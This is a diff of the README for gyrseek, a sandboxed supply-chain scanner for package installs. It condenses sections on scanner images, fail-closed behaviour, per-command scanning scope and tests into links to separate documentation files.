-| Mode               | macOS (Docker Desktop)                                   | Linux host/VM                                                |
-| --------- | -------------------------------------------------------- | ------------------------------------------------------------ |
-| Docker (default)   | Supported                                                | Supported                                                    |
-| Host (`--no-sandbox`) | **Not supported** (`strace` has no macOS build; fails at the first probe) | Supported (requires local `strace`)               |
-
-CI covers macOS only in part: the `(macOS) Build and test without Docker` job builds the release binary on a macOS runner, runs every test that does not need a Docker daemon (a test that starts a real container is skipped) and checks `gyrseek --version`. GitHub's macOS runners have no Docker, so the sandbox itself (Docker Desktop's VM, seccomp there, trace streaming) is verified by hand on macOS, not in CI (open finding #513).
-
-### Scanner image configuration
-
-| Variable                                                       | Default                 | Purpose                                      |
-| -------------------------------------------------------------- | ----------------------- | -------------------------------------------- |
-| `GYRSEEK_NPM_SCANNER_IMAGE`                                    | `node:26.3-bookworm-slim@sha256:9898...` | npm/pnpm scanner image.                      |
-| `GYRSEEK_PY_SCANNER_IMAGE`                                     | `python:3.13-slim-bookworm@sha256:a5a7...` | Python scanner image (pip/uv/poetry).     |
-| `GYRSEEK_PREBUILT_SCANNER_IMAGES`                              | `false`                 | Enable prebuilt fast path for both managers. |
-| `GYRSEEK_NPM_SCANNER_PREBUILT` / `GYRSEEK_PY_SCANNER_PREBUILT` | `false`                 | Per-manager prebuilt override.               |
-| `GYRSEEK_DOCKER_APPARMOR_PROFILE`                               | `false`                 | Boolean toggle (`true`/`false`) for embedded AppArmor profile use in Docker sandbox runs. Loaded via `apparmor_parser` at runtime. On macOS (where `apparmor_parser` is unavailable) nothing is printed and no AppArmor profile applies. Requires `apparmor-utils` + prebuilt scanner image on native Linux hosts (runtime apt setup conflicts with profile). Defaults to `false` because the prerequisites are not always met. Recommended to enable on Linux hosts with prebuilt images for stronger path-based protection. |
-| `GYRSEEK_MEM_LIMIT`                                            | `2g`                    | Container memory limit and `/work` tmpfs size for probes. |
-| `GYRSEEK_TRACE_LIMIT`                                          | `1024m`                 | Size of the root-only tmpfs that holds one probe's trace (the largest trace accepted); a probe that fills it is blocked. Overrides `trace_limit` in `gyrseek.yaml`. |
-| `GYRSEEK_MAX_PROCESSES`                                        | `256`                   | Container process limit for probes. `GYRSEEK_PIDS_LIMIT` is accepted as a fallback. |
-
-In prebuilt mode, runtime setup (`apt-get`, Python `uv` bootstrapping, `corepack enable pnpm`) is skipped to reduce hot-path latency.
-
-#### Python and Node version for the sandbox
-
-The sandbox runs on the Python or Node your project uses, so the wheels, dependency markers and `engines` checks it sees match your real install. gyrseek picks the version in this order and prints the choice (for example `Sandbox Python 3.11 (from .../.python-version)`):
-
-1. `GYRSEEK_PY_SCANNER_IMAGE` / `GYRSEEK_NPM_SCANNER_IMAGE`, if set (your own image; nothing else is consulted).
-2. `python_version` / `node_version` in the gyrseek config.
-3. The nearest project file, searched from the current directory upwards, first match wins:
-
-   | Runtime | Exact version files (read first, in one directory) | Version ranges (read if the directory has no exact file) |
-   | --- | --- | --- |
-   | Python (pip, uv, poetry) | `.python-version` | `[project] requires-python`, else Poetry's `[tool.poetry.dependencies] python` in `pyproject.toml` |
-   | Node (npm, pnpm) | `.nvmrc`, `.node-version` | `engines.node` in `package.json` |
-
-4. The default: Python 3.13, Node 26.
-
-A file naming one version (`3.11`, `3.11.4`, `cpython-3.11.4`, `v22.1.0`, `22`) selects that Python minor or Node major. A range (`>=3.9,<3.13`, Poetry's `^3.9` / `~3.10` / `3.11.*` / `^3.9 || ^3.10`, npm's `>=18 <23` / `^20.9.0 || ^22` / `20.x`) selects the **default if it fits, otherwise the closest supported version below it, otherwise the closest above**. For example `>=3.9` gives 3.13, `>=3.9,<3.13` gives 3.12 and `<3.11` gives 3.10. Newer Pythons have fewer wheels for older releases, so staying near the default is the safer choice.
-
-Supported versions: **Python 3.10, 3.11, 3.12, 3.13, 3.14** and **Node 20, 22, 24, 26**. Each is a digest-pinned image built into gyrseek, so a project file can only choose from this list, never name an arbitrary image. Anything unusable (`pypy3.10`, `system`, `lts/*`, `3.8`, a range that allows none of the supported versions, a hyphen range such as `16 - 18`, or a range gyrseek cannot parse) is ignored with a warning and the default is used. An unsupported value in the config file is an error instead. Only the runtime being scanned is read: an npm run ignores `.python-version` and the reverse. To build a prebuilt image for a version, pass `--build-arg PYTHON_BASE=<image>` to `docker/Dockerfile.python` or `--build-arg NODE_BASE=<image>` to `docker/Dockerfile.npm`.
-
-## Prebuilt Scanner Images
-
-For faster probe startup and fewer runtime setup failures, prebuild scanner images with the required tools already installed. Prebuilt Dockerfiles ship with the repo at `docker/Dockerfile.npm` and `docker/Dockerfile.python`.
-
-### 1) Build the scanner images
-
-```bash
-# npm/pnpm scanner
-just docker-build-npm
-
-# Python scanner (pip/uv/poetry)
-just docker-build-python
-```
-
-Or build directly:
-
-```bash
-docker build -f docker/Dockerfile.npm -t gyrseek-npm-scanner:latest .
-docker build -f docker/Dockerfile.python -t gyrseek-python-scanner:latest .
-```
-
-### 2) Use a prebuilt image
-
-```bash
-GYRSEEK_NPM_SCANNER_IMAGE=gyrseek-npm-scanner:latest \
-GYRSEEK_NPM_SCANNER_PREBUILT=true \
-./target/release/gyrseek npm update
-
-GYRSEEK_PY_SCANNER_IMAGE=gyrseek-python-scanner:latest \
-GYRSEEK_PY_SCANNER_PREBUILT=true \
-./target/release/gyrseek uv sync
-```
-
-### 3) Enable prebuilt mode globally (optional)
-
-```bash
-GYRSEEK_PREBUILT_SCANNER_IMAGES=true \
-GYRSEEK_NPM_SCANNER_IMAGE=gyrseek-npm-scanner:latest \
-GYRSEEK_PY_SCANNER_IMAGE=gyrseek-python-scanner:latest \
-./target/release/gyrseek npm update
-```
-
-### 4) Verify images are usable
-
-```bash
-docker run --rm gyrseek-npm-scanner:latest sh -lc 'strace -V'
-docker run --rm gyrseek-python-scanner:latest sh -lc 'strace -V && uv --version'
-```
-
-If these pass, `GYRSEEK_*_SCANNER_PREBUILT=true` should work without runtime tool installation.
-
-### 5) Use pinned image digests (recommended for reproducibility)
-
-To avoid tag drift, pin scanner images by digest (replace with real digests from your registry):
-
-```bash
-GYRSEEK_NPM_SCANNER_IMAGE=gyrseek/npm-scanner@sha256:REPLACE_WITH_REAL_DIGEST \
-GYRSEEK_PY_SCANNER_IMAGE=gyrseek/py-scanner@sha256:REPLACE_WITH_REAL_DIGEST \
-GYRSEEK_PREBUILT_SCANNER_IMAGES=true \
-./target/release/gyrseek npm update
-```
-
-> **Tip:** Build and push scanner images once in CI, resolve immutable digests, and reference only digest-pinned images in production or shared CI.
-
-## Behavior Reference
-
-Details worth knowing once you're past the basics.
-
-**Execution & caching**
-
-- `gyrseek` forwards your command in the current working directory.
-- Repeated package-version probes within the same CLI execution are cached in-memory and reused.
-- Docker mode batches probe matrices (multiple packages × versions) into a single container run when possible.
-
-**Version handling**
-
-- Version selection is semantic-version aware: npm uses semver, Python (pip/uv/poetry) uses PEP 440. Unparseable version strings sort below any parseable version, so malformed entries are never chosen as `latest`.
-- After a clean scan of an unpinned (`latest`) **explicit install target**, the forwarded command is rewritten to pin the exact version that was examined, so the host installs the same version `gyrseek` scanned. Lockfile-driven flows (`uv sync`, `poetry install`, etc.) already carry pinned versions and are forwarded verbatim.
-- If baseline versions are unavailable, output may show `baseline-1=n/a` and `baseline-2=n/a`.
-
-**Per-command scanning scope**
-
-- `uv sync` scans all packages found in `uv.lock` before forwarding.
-- `uv sync`, `uv lock` (bare), and `uv lock --upgrade` exclude local project entries (editable/path/workspace blocks) from comparison.
-- `uv pip sync` scans all parseable packages from its source files (requirements-style files and `pylock.toml`).
-- `uv lock` (bare) and `uv lock --upgrade` scan all packages in `uv.lock`; both fail closed if `uv.lock` is missing or empty. `uv lock -P/--upgrade-package` scans the explicitly targeted packages. When `-P` is followed by a flag (e.g. `-P --dry-run`), the flag is not consumed as a package name and the next real `-P pkg` argument is not silently skipped.
-- `pip install` / `pip3 install` scan all parseable entries, including `-r/--requirements` files.
-- `poetry install`, `poetry update`, and `poetry lock` scan all packages in `poetry.lock`, excluding local directory/path/editable source blocks. `poetry lock` fails closed if `poetry.lock` is missing or empty.
-- **npm and pnpm scan the versions that are installed.** With packages named (`npm install lodash@4.17.21`, `pnpm add react`) each may be an exact version, a bare name, `@latest` or a range (scanned at the latest version, as described above); a dist-tag (`@next`) or an alias is refused with exit 1. With nothing named, `npm install`, `npm i`, `npm ci`, `pnpm install` and `pnpm i` scan every registry package in the lockfile (`npm-shrinkwrap.json` or `package-lock.json`, `pnpm-lock.yaml`), because that is what is installed. `package.json` is not used: its dependencies are ranges. With no lockfile they fail closed; create one without installing anything via `npm install --package-lock-only` or `pnpm install --lockfile-only`, which `gyrseek` forwards without a scan. `npm update` / `pnpm update` with no packages choose new versions when they run, so they fail closed too: run them with `--package-lock-only` / `--lockfile-only`, then install from the new lockfile. Non-registry specs (`file:`, `workspace:`, `git+`, URL, `link:`) are excluded.
-- **An install is refused when a setting redirects it to another registry.** Because the sandbox probes the public package, `--index-url`/`--extra-index-url`/`--find-links` (also inside `-r` requirements files), `--registry`, `PIP_*`/`UV_*`/`npm_config_*` variables, `pip.conf`, `uv.toml`/`[tool.uv]`, `[[tool.poetry.source]]` and `.npmrc` that name a host other than the public registry or one in `trusted_index_hosts` exit 1 before anything is scanned, naming the setting and the host (never credentials). Local paths and `file:` URLs are your own files and are left alone, and commands that are not scanned (`uv venv`) are not checked. Not detected yet: see open finding #450.
-- **A lockfile install is refused when its hashes are not the public registry's.** Before the scan, every package a lockfile pins (npm, pnpm, `uv.lock`, `poetry.lock`, `pylock.toml`) is compared with the hashes the public registry publishes for that version: a locked hash the registry does not publish, an entry with no hash, a registry that cannot be reached, or a Python lock that pins only the source distribution while wheels exist (the install would build it, the scan did not) exits 1, so a mirror cannot serve other files for a locked version. Requirements files are compared the same way through their `--hash` options (a line without one is refused only when `trusted_index_hosts` is set). Packages in `internal_package_exemptions` are skipped. Not covered: packages named on the command line through a mirror (#481) and the wheels of other platforms (#482).
-- **npm, pnpm and `uv sync` lockfile installs install exactly what was scanned.** A no-argument `npm install`/`npm i` is forwarded as `npm ci` (which refuses a lockfile that disagrees with `package.json`; if both `npm-shrinkwrap.json` and `package-lock.json` exist, every entry of both is scanned, because npm 11 prefers the shrinkwrap and npm 12 ignores it, so with npm 12 rename or delete the old shrinkwrap) and `pnpm install`/`pnpm i` gets `--frozen-lockfile`; flags that turn the lockfile off (`--no-package-lock`, `--no-frozen-lockfile`, `--lockfile=false`, …) exit 1 before anything is scanned. `uv sync` is forwarded as `uv sync --locked` (uv fails instead of re-locking; `--upgrade`/`--upgrade-package` exit 1, `--frozen` is kept); `poetry install` refuses a stale lockfile on its own and is forwarded as typed. For every manager, lockfile entries that do not come from `registry.npmjs.org` (npm/pnpm) or PyPI (`uv.lock`, `poetry.lock`): another host or index, git, ssh, a tarball URL, exit 1 and are named (credentials and query strings in a URL are never printed), unless the package is in `internal_package_exemptions`; `file:` and relative paths are your own code and are left out. Every file gyrseek reads to decide what to scan (requirements files, lockfiles) is checked again before forwarding, and if one changed during the scan the command exits 1 and must be run again.
-- `uv venv` and other unrecognized `uv` subcommands are forwarded verbatim (unscanned passthrough).
-
-**Fail-closed guarantees**
-
-- **Unrecognized manager:** any first argument other than `pip`, `pip3`, `uv`, `poetry`, `npm`, or `pnpm` is rejected with a non-zero exit and a clear error message listing the supported managers. Previously, unrecognized managers were silently forwarded unscanned.
-- For supported install/sync paths, package-detection failures are fail-closed (non-zero exit) instead of passthrough.
-- If the host command itself cannot be launched after a clean scan, `gyrseek` also fails closed.
-- A package whose **import step** (loading the installed package) runs longer than `import_timeout_seconds` (default 300) is blocked as `import_failed`. See the import-time scan above for how a failed load is judged.
-- A probe that runs longer than `probe_timeout_seconds` (default 300) is stopped and **that package is blocked**; the rest of the batch is still scanned. Slow but legitimate source builds (for example numpy or pandas in an image with a compiler) can hit it: the message names the package and the setting, and the fix is to raise `probe_timeout_seconds` in `gyrseek.yaml`.
-- Inside a `-r` requirements file every line must be pinned (`name==1.2.3`): `gyrseek` cannot pin lines in a file, so a bare name there would be resolved again at install time. `npm install --package-lock-only false` is an ordinary install and is scanned; a real `--package-lock-only` / `--lockfile-only` command is forwarded with `--ignore-scripts` because npm still runs the project's `prepare` script in that mode.
-- **Version ranges on the command line are scanned at the latest version.** `uv add 'pytest>=9'`, `pip install 'requests~=2.31'`, `poetry add requests@^2` and `npm install lodash@^4` scan the latest version of the package, check that it satisfies the range you wrote, and install that exact version (the range is replaced by the version that was scanned, and `gyrseek` prints a line saying so). If the latest version is outside your range (`npm install lodash@^3` when 4.x is out), `gyrseek` exits 1: it only scans the latest version, so it cannot vouch for what the range would install. Write the exact version, or widen the range. Direct references (`name @ https://…`) and dist-tags (`@next`) exit 1. For a whole project use `uv sync`, `uv lock` or `poetry install`, which are scanned from the lockfile.
-- `pip`, `uv pip install`, `uv add` and `poetry add` scan **every** package named on the command line, including those in `-r` requirements files. `-r` includes inside a requirements file are followed. `-r pyproject.toml` (or any other non-requirements file) and an unreadable `-r` file, at any depth, fail closed: use `uv sync`/`uv lock`, or a requirements file with pinned versions.
-- If a package's **install fails inside the sandbox** (the candidate or any baseline version), `gyrseek` blocks it with `install_failed`. The message names the failed versions and exit codes and prints the package manager's own error. This is not a `gyrseek` error: fix the install (a dependency that does not resolve, a build that fails) and run `gyrseek` again. The sandbox is a locked-down Linux container, so a package that must be built from source can fail there even though it installs on your machine; point `GYRSEEK_PY_SCANNER_IMAGE` or `GYRSEEK_NPM_SCANNER_IMAGE` at an image that matches your project.
-- A sandbox probe that produces an **empty/whitespace trace** (e.g. `strace` could not attach) is a hard error: every package in that batch is blocked. Blank traces are never interpreted as clean.
-- **Post-install artifact findings** — binary executables, suspicious `.pth` files, unexpected runtimes, and large files — are diffed across versions. A finding newly present in the current version (absent from all baselines) fails closed (see [Post-Install Artifact Detection](#post-install-artifact-behavior-detection)).
-- When a forwarded command exits non-zero, `gyrseek` **exits with the same code** rather than masking the failure as success.
+Docker is the default and the only sandbox that isolates anything. Host mode must be requested explicitly with `--no-sandbox`, runs the package directly on your machine with your environment, and detects but does not protect: use it only in a disposable environment that holds no secrets. Platform support, scanner images (including Python and Node version selection), prebuilt images and digest pinning are in [docs/SANDBOX.md](docs/SANDBOX.md); hardening of the container is in [docs/DOCKER_SECURITY.md](docs/DOCKER_SECURITY.md).
 
 ## Docker Security
 
-See [`docs/DOCKER_SECURITY.md`](docs/DOCKER_SECURITY.md) for the canonical reference on Docker sandbox hardening, including:
+See [docs/DOCKER_SECURITY.md](docs/DOCKER_SECURITY.md) for the canonical reference on how the sandbox container is hardened (seccomp, AppArmor, capabilities, unprivileged payload, trace integrity) and what it does not cover.
 
-- **Seccomp profile** — embedded in `src/sandbox.rs`, enabled by default, materialized to a temp file at runtime. Denies high-risk syscalls — notably `io_uring`, which would otherwise let a package perform file I/O invisible to `strace` — while preserving network access for package managers. Active on every platform, including macOS Docker Desktop and WSL2, because it is enforced by the container's Linux kernel rather than the host OS. **This is the layer detection integrity depends on; do not disable it.**
-- **AppArmor profile** — embedded in `src/sandbox.rs`, disabled by default (`GYRSEEK_DOCKER_APPARMOR_PROFILE`, default `false`); enable explicitly with `GYRSEEK_DOCKER_APPARMOR_PROFILE=true`. Loaded via `apparmor_parser` at runtime. **Native Linux hosts only** (requires `apparmor-utils` + a prebuilt scanner image): permanently unavailable on macOS, where no `apparmor_parser` exists and Docker Desktop's LinuxKit kernel lacks the AppArmor LSM — gyrseek prints nothing and no AppArmor profile applies. Recommended on Linux for stronger path-based protection, but marginal for supply-chain detection; see [Is seccomp enough, or is AppArmor required?](docs/DOCKER_SECURITY.md#is-seccomp-enough-or-is-apparmor-required).
-- **Capabilities** — `SYS_PTRACE` added for cross-UID strace; `no-new-privileges` enabled.
-- **Unprivileged payload** — traced install runs as an unprivileged user; its trace logs are kept in a root-only, size-limited tmpfs inside the container and streamed to gyrseek on stdout, with no host mount, so the payload can neither alter them nor fill the host's disk (FIXED #411, #434, #461; checked on macOS Docker Desktop and, in CI, on Linux; WSL2 is not tested).
-- **Validation checklist**, troubleshooting, backout plan, and current hardening limitations.
+## Documentation
 
-## Testing
-
-Tests follow Rust convention: everything that doesn't need to spawn the compiled binary lives inline in its `src/` module under `#[cfg(test)]`, giving tests direct access to private items. Only CLI-level exit-code tests that must spawn the real binary remain in `tests/`.
-
-**Unit and integration tests** (no Docker required):
-
-```bash
-# Run everything
-just test
-just lint
-
-# Or directly:
-cargo test
-
-# Run tests from a specific source module
-cargo test --lib scanning
-cargo test --lib parsing
-cargo test --lib
-
-# Run the CLI exit-code integration tests (spawn the binary)
-cargo test --test cli_burst_exit_tests
-cargo test --test forward_fail_closed_tests
-cargo test --test lock_routing_tests
-cargo test --test pnpm_routing_tests
-cargo test --test version_flag_tests
-cargo test --test sandbox_startup_exit_tests
-
-# Run one specific test case by name
-cargo test parses_npm_install_with_pinned_version
-cargo test detects_anomalous_new_connection
-cargo test flags_newly_introduced_bun_execution
-
-# Show println! output while testing
-cargo test -- --nocapture
-```
-
-**End-to-end tests** (requires Docker and the release binary):
-
-```bash
-just test-npm
-just test-pnpm
-just test-pip
-just test-uv
-just test-poetry
-```
-
-Behavior test coverage includes deterministic DNS-enrichment checks, FCrDNS forward-confirmation, bracketed-argv preservation, process-execution detection, git-clone signature diffing, and release-burst policy enforcement.
-
-## Project Layout & Docs
-
-**Source & tests**
-
-Tests follow Rust convention — inline in their module under `#[cfg(test)]`, only CLI-level exit-code tests remain in `tests/`.
-
-- `src/main.rs` — binary entrypoint
-- `src/lib.rs` — command routing, orchestration, config loading; inline tests for `GyrSeek::parse_package_details`
-- `src/parsing.rs` — command, lockfile, and requirements parsing; inline tests for all parsers and `rewrite_args_with_pinned_versions`
-- `src/scanning.rs` — registry lookup and behavior scanning engine; inline tests for version ordering, trace extraction, network/git-clone/process-execution detection, FCrDNS, and full scan pipeline
-- `src/runtime_image.rs` — Python/Node sandbox image selection from project version files and config; inline tests for ranges and precedence
-- `src/sandbox.rs` — sandbox backends and mode selection; inline tests for docker args, strace flags, and unprivileged-payload integrity
-- `tests/cli_burst_exit_tests.rs` — release burst and minimum release age CLI exit-code tests (spawn binary)
-- `tests/forward_fail_closed_tests.rs` — fail-closed forwarding and exit-status propagation tests (spawn binary)
-- `tests/lock_routing_tests.rs` — `poetry lock`, `uv lock`, `pnpm install` routing and `uv venv` passthrough tests (spawn binary)
-- `tests/pnpm_routing_tests.rs` — `pnpm add` / `pnpm install` routing tests (lockfile scan, non-registry specs; spawn binary)
-- `tests/npm_lockfile_tests.rs` — `npm install` / `i` / `ci` scan the lockfile, no-lockfile and `update` fail closed, ranges on the command line exit 1, lockfile-only commands are forwarded (spawn binary)
-- `tests/sandbox_startup_exit_tests.rs` — sandbox startup failures (Docker missing or daemon down, an unscanned passthrough never initializing the sandbox, the retired `GYRSEEK_SANDBOX` variable being ignored) exit 1 with a cause-specific message (spawn binary with a fake `docker`)
-- `tests/version_flag_tests.rs` — `--version`/`-V` print-and-exit and forwarded trailing `--version` passthrough tests (spawn binary)
-
-**Just recipes**
-
-- `just build` — release build
-- `just install` / `just uninstall` — install or remove the Cargo bin
-
-- `just tag` — tag `HEAD` with the `Cargo.toml` version and push to `origin`
-- `just fmt` — format Rust code
-- `just test` — run Rust tests
-- `just lint` — run cargo check, clippy, and format checks
-- `just test-{npm,pnpm,pip,uv,poetry}` — end-to-end tests per manager
-
-**Collaboration docs** (for multi-developer / multi-LLM work)
-
-- `docs/ARCHITECTURE.md` — control-flow and component map, plus the contributor workflow and change hygiene
-- `docs/ROADMAP.md` — planned improvements and next steps
-- `docs/OPEN_FINDINGS.md`, `docs/FIXED_FINDINGS.md`, `docs/WONT_FIX_FINDINGS.md` — security and correctness findings logs
-- `docs/DETECTION_COVERAGE.md` — known supply chain attack waves, gyrseek's verdict on each, and the gaps
-- `docs/DOCKER_SECURITY.md` — Docker sandbox security reference (seccomp, AppArmor, capabilities, validation)
-- `AGENTS.md` — repository memory and mandatory update policy
+| Document | What it covers |
+|---|---|
+| [docs/DETECTION.md](docs/DETECTION.md) | Each behavior check in detail: network, git clone, process execution, sensitive files, artifacts |
+| [docs/DETECTION_COVERAGE.md](docs/DETECTION_COVERAGE.md) | Known supply chain attack waves, gyrseek's verdict on each, and the gaps |
+| [docs/CONFIGURATION.md](docs/CONFIGURATION.md) | CLI arguments, every config key, a full example |
+| [docs/BEHAVIOR_REFERENCE.md](docs/BEHAVIOR_REFERENCE.md) | Per-command scanning scope, version handling, lockfiles and edge cases |
+| [docs/SANDBOX.md](docs/SANDBOX.md) | Sandbox modes, platform support, scanner images, prebuilt images |
+| [docs/DOCKER_SECURITY.md](docs/DOCKER_SECURITY.md) | Container hardening: seccomp, AppArmor, capabilities, validation |
+| [docs/DEVELOPMENT.md](docs/DEVELOPMENT.md) | `just` recipes and how to run the tests |
+| [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) | Control flow, components, CI/CD, threat model, contributor workflow |
+| [docs/ROADMAP.md](docs/ROADMAP.md) | Planned improvements |
+| [docs/OPEN_FINDINGS.md](docs/OPEN_FINDINGS.md), [FIXED](docs/FIXED_FINDINGS.md), [WONT_FIX](docs/WONT_FIX_FINDINGS.md) | Security and correctness findings logs |
+| [AGENTS.md](AGENTS.md) | Repository memory and the mandatory update policy for contributors and agents |
 
 > **Repository policy:** after each change, update both `AGENTS.md` and `README.md`.
 
